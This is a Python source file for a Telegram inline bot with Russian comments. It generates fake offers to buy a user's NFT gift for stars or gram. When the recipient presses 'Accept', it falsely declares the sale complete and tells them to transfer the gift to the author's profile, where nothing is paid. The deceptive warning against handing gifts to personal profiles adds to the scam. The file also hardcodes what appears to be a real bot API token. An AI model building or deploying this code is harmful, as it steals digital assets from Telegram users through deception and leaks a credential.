import asyncio
import re
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    CallbackQuery,
)

# Твой токен от BotFather
API_TOKEN = "9210829087:AAFqIdKWeIKeZseZtU5eJNOi8DTbIxA9z6Y"
# Твой юзернейм для получения подарков
MY_USERNAME = "GTsainex"

bot = Bot(token=API_TOKEN)
dp = Dispatcher()


# Клавиатура с кнопками "Отклонить" и "Принять"
def get_accept_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="Отклонить", callback_data="decline"),
                InlineKeyboardButton(text="Принять", callback_data="accept"),
            ]
        ]
    )


# Клавиатура после принятия оффера
def get_transfer_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🎁 Передать подарок", url=f"https://t.me/{MY_USERNAME}"
                )
            ]
        ]
    )


# Команда /start
@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer(
        "👋 Привет!\n\n"
        "Этот бот работает через **инлайн-режим**.\n"
        "Просто зайди в любой чат, начни вводить имя бота и параметры:\n"
        "`@твои_бот https://t.me/nft/gift 30 gram` (или `stars`)",
        parse_mode="Markdown",
    )


# Обработка инлайн-запросов (когда пишут @bot_name ссылка сумма валюта)
@dp.inline_query()
async def inline_offer_handler(inline_query: InlineQuery):
    text = inline_query.query.strip()
    
    # Пример ввода: https://t.me/nft/XmasStocking-121380 30 gram
    parts = text.split()
    
    if len(parts) < 3:
        # Если пользователь еще не до конца написал запрос, показываем подсказку
        result = InlineQueryResultArticle(
            id="help",
            title="⚠️ Формат: [ссылка] [сумма] [gram/stars]",
            description="Пример: https://t.me/nft/XmasStocking-121380 30 gram",
            input_message_content=InputTextMessageContent(
                message_text="❌ Ошибка: неверный формат. Используйте: `@bot_name ссылка сумма gram/stars`",
                parse_mode="Markdown"
            )
        )
        await inline_query.answer([result], cache_time=1)
        return

    link = parts[0]
    amount = parts[1]
    currency_raw = parts[2].lower()

    # Определяем валюту
    if "star" in currency_raw:
        currency = "⭐ stars"
    else:
        currency = "💎 gram"

    # Автоматически вытаскиваем название подарка из ссылки
    gift_slug = link.split("/")[-1] if "/" in link else link
    gift_name = gift_slug.replace("-", " #")

    # Формируем текст оффера
    offer_text = (
        f"🎁 **Предложение о покупке!**\n\n"
        f"buyer предлагает Вам\n\n"
        f"{amount} {currency} за подарок `{gift_name}`.\n\n"
        f"⏳ Предложение действует ещё **6ч 00м**.\n\n"
        f"🔗 {link}"
    )

    # Создаем карточку для отправки
    result = InlineQueryResultArticle(
        id="offer_card",
        title=f"🎁 Оффер: {amount} {currency} за {gift_name}",
        description="Нажмите, чтобы отправить карточку в чат",
        input_message_content=InputTextMessageContent(
            message_text=offer_text,
            parse_mode="Markdown"
        ),
        reply_markup=get_accept_keyboard()
    )

    await inline_query.answer([result], cache_time=1)


# Обработка нажатия "Отклонить"
@dp.callback_query(F.data == "decline")
async def process_decline(callback: CallbackQuery):
    await callback.message.edit_text("❌ Предложение было отклонено.")
    await callback.answer("Оффер отклонен")


# Обработка нажатия "Принять"
@dp.callback_query(F.data == "accept")
async def process_accept(callback: CallbackQuery):
    await callback.answer(
        "Оффер принят!\n\nПередайте подарок по кнопке «Передать подарок».",
        show_alert=True,
    )

    success_text = (
        "🎁 **Подарок успешно продан!**\n\n"
        f"• Отправьте подарок на профиль `@ {MY_USERNAME}`, чтобы получить оплату.\n\n"
        "⚠️ **ВАЖНО:** если вас просят передать подарок на личный профиль — не передавайте. "
        "Передача выполняется исключительно по кнопке «Передать подарок» ниже."
    )

    await callback.message.edit_text(
        success_text, reply_markup=get_transfer_keyboard(), parse_mode="Markdown"
    )


async def main():
    print("Инлайн-бот запущен и готов к работе...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
